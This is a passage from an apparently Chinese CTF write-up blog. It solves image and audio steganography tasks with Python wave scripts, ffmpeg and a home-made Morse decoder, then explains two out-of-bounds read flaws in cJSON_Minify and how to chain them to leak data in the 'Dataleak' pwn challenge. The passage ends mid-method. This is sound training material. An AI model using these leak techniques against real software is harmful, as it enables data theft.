最后使用 stegsolve 异或一下就可以了&lt;br /&gt;
可能是因为拼图做的太糙了，所以异或出来的图有亿点不太对劲&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436840/Typera/2023/04/a7cb74294bd4da8aa2f732cbc86f4c4b.bmp&#34; alt=&#34;SM5&#34; /&gt;&lt;br /&gt;
ps 处理了一下总算好看了&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436868/Typera/2023/04/8898d7e36e8d29377d803605af7967da.png&#34; alt=&#34;SM6&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;in_the_vaporwaves117118&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#in_the_vaporwaves117118&#34;&gt;#&lt;/a&gt; in_the_vaporwaves（1.17/1.18）&lt;/h3&gt;
&lt;p&gt;此前我对音频隐写了解甚少，只会简单地使用 Audacity，对音频文件做一些基本的观察、操作，&lt;br /&gt;
本题中涉及到 Python 的 wave 库使用，那就可以正好趁这个机会去学习一下。&lt;/p&gt;
&lt;h4 id=&#34;观察原文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#观察原文件&#34;&gt;#&lt;/a&gt; 观察原文件&lt;/h4&gt;
&lt;p&gt;通过 Audacity 打开 c.wav，播放的时候稍微有点杂音，但听不出有什么不太对的地方 (/▽＼)&lt;br /&gt;
 放大来看，可以看出左右声道的波形貌似正好上下相反：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436891/Typera/2023/04/942c468dbd87e4787052099f715283e8.png&#34; alt=&#34;image-20230425233447828&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;1使用wave库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1使用wave库&#34;&gt;#&lt;/a&gt; ①使用 Wave 库&lt;/h4&gt;
&lt;p&gt;使用 python 的 Wave 库将左右声道加起来，导出为一个 a.wav 的文件&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;nchannels&lt;/strong&gt;: 声道数，&lt;strong&gt;sampwidth&lt;/strong&gt;: 量化位数，&lt;strong&gt;framerate&lt;/strong&gt;: 采样频率，&lt;strong&gt;nframes&lt;/strong&gt;: 采样点数&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Wave 写入对象&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Wave_write.setnchannels(n)&lt;/strong&gt;&lt;br /&gt;
 设置声道数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Wave_write.setsampwidth(n)&lt;/strong&gt;&lt;br /&gt;
 设置采样字节长度为 n。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Wave_write.setframerate(n)&lt;/strong&gt;&lt;br /&gt;
 设置采样频率为 n。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Wave_write.writeframes(data)&lt;br /&gt;
 写入音频帧并确保 nframes 是正确的。 如果输出流不可查找且在 data 被写入之后写入的总帧数与之前设定的 nframes 值不匹配将会引发错误。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Write 读取对象&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Wave_read.getnframes()&lt;/strong&gt;&lt;br /&gt;
 返回音频总帧数。&lt;br /&gt;
&lt;strong&gt;Wave_read.readframes(n)&lt;/strong&gt;&lt;br /&gt;
 读取并返回以 bytes 对象表示的最多 n 帧音频。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;struct 库：将字节串解读为打包的二进制数据&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;struct.unpack(format, buffer)&lt;/strong&gt;&lt;br /&gt;
 根据格式字符串 format 从缓冲区 buffer 解包（假定是由 pack (format, ...) 打包）。 结果为一个元组，即使其只包含一个条目。 缓冲区的字节大小必须匹配格式所要求的大小，如 calcsize () 所示。&lt;br /&gt;
&lt;strong&gt;struct.pack(format, v1, v2, ...)&lt;/strong&gt;&lt;br /&gt;
 返回一个 bytes 对象，其中包含根据格式字符串 format 打包的值 v1, v2, ... 参数个数必须与格式字符串所要求的值完全匹配。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;参照官方 wp，编写的脚本：&lt;br /&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; wave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; struct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; wave.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;c.wav&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;rb&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; c:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; wave.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;a.wav&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;wb&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; a:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		a.setnchannels(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		a.setsampwidth(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;#此处量化位数应改为2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		a.setframerate(&lt;span class=&#34;number&#34;&gt;44100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(c.getnframes()):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			l,r=struct.unpack(&lt;span class=&#34;string&#34;&gt;&amp;#x27;hh&amp;#x27;&lt;/span&gt;, c.readframes(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			d=l+r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			a.writeframes(struct.pack(&lt;span class=&#34;string&#34;&gt;&amp;#x27;h&amp;#x27;&lt;/span&gt;,d))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 但是，实际运行的时候，我发现这个脚本貌似有点问题...&lt;br /&gt;
 如果直接套用运行出来的音频长这样：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436900/Typera/2023/04/c6b92eaad52ca5f54cbb80e1c01191cc.png&#34; alt=&#34;image-20230425233457628&#34; /&gt;&lt;br /&gt;
 然后我仔细检查发现，官方 wp 的量化位数设成了 1，改成 2 就可以了... (。_。)&lt;br /&gt;
（着实花了我好久，还以为是我自己写错了）&lt;br /&gt;
出来的 a.wav 如下图&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436908/Typera/2023/04/47a2223d0102f0f858b27c6b0cc851ae.png&#34; alt=&#34;image-20230425233505802&#34; /&gt;&lt;/p&gt;
&lt;p&gt;但是，这脚本运行的时间也太长了吧，&lt;strong&gt;[Finished in 262.9s]&lt;/strong&gt;  (￣▽￣)&amp;quot;&lt;br /&gt;
 所以我又找到了一个比较快捷的方法：&lt;/p&gt;
&lt;h4 id=&#34;2ffmpeg&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2ffmpeg&#34;&gt;#&lt;/a&gt; ②ffmpeg&lt;/h4&gt;
&lt;p&gt;使用 ffmpeg 进行双声道合并，&lt;br /&gt;
从&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mZm1wZWcub3Jn&#34;&gt;链接&lt;/span&gt;（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qb2hudmFuc2lja2xlLmNvbS9mZm1wZWcvJUVGJUJDJTg5JUU0JUI4JThCJUU4JUJEJUJEZmZtcGVnJUU1JTg4JUIwTGludXglRTclOEUlQUYlRTUlQTIlODMlRTQlQjglOEIlRUYlQkMlOEMlRTglQkYlOTAlRTglQTElOEMlRUYlQkMlOUE=&#34;&gt;https://johnvansickle.com/ffmpeg/）下载 ffmpeg 到 Linux 环境下，运行：&lt;/span&gt;&lt;br /&gt;
 &lt;code&gt;ffmpeg -i c.wav -f wav -ac 1 -ab 128k -y 1_dan1.wav&lt;/code&gt;  命令，&lt;br /&gt;
获得 a.wav 文件。&lt;/p&gt;
&lt;p&gt;这次得到的 a.wav 是这样的：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436919/Typera/2023/04/6e8ff45b5b28216617a2427f50628c81.png&#34; alt=&#34;image-20230425233516666&#34; /&gt;&lt;br /&gt;
 差别不大～&lt;br /&gt;
 这就是比较常规的摩斯密码了，转换后得到 flag&lt;/p&gt;
&lt;h4 id=&#34;摩斯电码音频转文字119&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#摩斯电码音频转文字119&#34;&gt;#&lt;/a&gt; 摩斯电码音频转文字（1.19）&lt;/h4&gt;
&lt;p&gt;emm... 我顺带研究了一下，如何用 python 把摩斯密码从音频文件里直接读出来，&lt;br /&gt;
这个脚本我另外找了一道题试验了一下，应该是没啥问题的，&lt;br /&gt;
（它只适用于单声道的摩斯电码，所以使用前要先处理好音频文件）&lt;br /&gt;
稀烂的编程水平就不提了，代码如下：&lt;br /&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; wave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; scipy.io &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; wavfile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;filename = &lt;span class=&#34;string&#34;&gt;&amp;#x27;a.wav&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WAVE = wave.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(filename)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sample_frequency, audio_sequence = wavfile.read(filename)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;space=[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;voice=[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l1=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l2=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(WAVE.getparams().nframes):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(audio_sequence[i]&amp;lt;=&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; audio_sequence[i]&amp;gt;=-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        l1=l1+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt;((audio_sequence[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&amp;lt;=&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; audio_sequence[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&amp;gt;=-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; (audio_sequence[i]&amp;gt;&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; audio_sequence[i]&amp;lt;-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; l1&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            space.append(l1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        l1=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(WAVE.getparams().nframes):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(audio_sequence[i]&amp;gt;&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; audio_sequence[i]&amp;lt;-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        l2=l2+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt;((audio_sequence[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&amp;gt;&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; audio_sequence[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&amp;lt;-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; (audio_sequence[i]&amp;lt;=&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; audio_sequence[i]&amp;gt;=-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; (audio_sequence[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&amp;lt;=&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; audio_sequence[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&amp;gt;=-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        voice.append(l2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        l2=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;m_s=&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(space)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;M_s=&lt;span class=&#34;built_in&#34;&gt;max&lt;/span&gt;(space[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;m_v=&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(voice)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;tran&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(voice[i]//m_v==&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;-&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Str=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(space)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(space[i]//m_s==&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Str=Str+tran(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt;(space[i]&amp;gt;M_s):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	voice.insert(i,voice[i])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	Str=Str+&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Str=Str+tran(i)+&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Str=Str+tran(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(voice)-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; (Str)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;pwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn&#34;&gt;#&lt;/a&gt; pwn&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;pwn 部分... 由于我手残删掉了保存源文件，最后只问学长要到了其中两道题的，对我复现造成了极大的困扰，不过幸好这次的官方 wp 挺详细的，还可以对着 wp 一点一点的想，但我是菜鸡本菜，还是花了超多的时间去复现 ╥﹏╥... 不过总体来说收获还是挺多的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;dataleak129&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dataleak129&#34;&gt;#&lt;/a&gt; Dataleak（1.29）&lt;/h3&gt;
&lt;p&gt;&lt;s&gt;（隔了挺久的... 除了中间混了个 hgame，还有 HWS 入营赛 (虽然太菜了没啥用)，当然还有在认真地摸鱼啦）&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;连上远程，需要 leak 的数据长度为 22，&lt;br /&gt;
IDA 查看 cJSON_PWN：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436929/Typera/2023/04/4dcc2553fda4e522e344eccb3f71b8fd.png&#34; alt=&#34;image-20230425233526169&#34; /&gt;&lt;br /&gt;
 内存结构还是比较清楚的&lt;br /&gt;
按定义顺序，先是 buf，然后是 v5，最后是 v6 (存要 leak 的数据的地方)&lt;br /&gt;
 两次循环，每次 buf、v5，写入数据长 14，结尾均有 \x00&lt;br /&gt;
 每次 cJSON_Minify () 先处理 buf 的字符，然后读出 v5 中 11 字节&lt;/p&gt;
&lt;h4 id=&#34;漏洞点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞点&#34;&gt;#&lt;/a&gt; 漏洞点&lt;/h4&gt;
&lt;p&gt;一共应该有两个漏洞点，可以从给的 so 文件中查看，&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;处理 /* 的时候，会不断遍历中间的字符直到遇到 \x00 &lt;s&gt;（或 */ ）&lt;/s&gt;，可能造成越界&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436937/Typera/2023/04/560f7380f89320b8d0bfa86942368be9.png&#34; alt=&#34;image-20230425233533907&#34; /&gt;&lt;/li&gt;
&lt;li&gt;处理 &amp;quot; 的时候，如果遇到 \ ，会越过两个字符&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682436946/Typera/2023/04/0d185944b3f9a89c3f0cebb68e2e1cdd.png&#34; alt=&#34;image-20230425233541340&#34; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中，第一个漏洞会将遍历到的字符舍去，所以后续的字符会填充到遍历过的字符位置上（包括 /*），而第二个漏洞只会越过 \ 后的两个字符，中间遍历的字符将会保留。&lt;/p&gt;
&lt;p&gt;所以会有多个方法实现 data 的泄露，而第一个漏洞能够达成的效果强于第二个，所以可以全程使用第一个漏洞完成泄露&lt;/p&gt;
&lt;h4 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h4&gt;
&lt;p&gt;由于一次只能读取 11 个字符，所以需要 leak 两次，&lt;br /&gt;
但大致思路就是要利用漏洞，先越过 buf 后的 \x00，让 cJSON_PWN 能继续处理 v5 的字符，&lt;br /&gt;
然后变换 /* 的位置，将 v5 内的字符替换为我们所需要的 data&lt;/p&gt;
&lt;h5 id=&#34;方法1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法1&#34;&gt;#&lt;/a&gt; 方法 1&lt;/h5&gt;
&lt;p&gt;如果两个漏洞都想利用到的话，可以先使用第二个漏洞，将 \ 出现的位置放在 buf 的末尾（就是第 14 个字符），从而越过后面的 \x00 继续处理 v5，&lt;br /&gt;
然后 /* 放在 v5 的开头，直接替换后面 16 个 data 的位置（算上开头的 /* 和末尾的 \x00 一共 16 个）&lt;br /&gt;
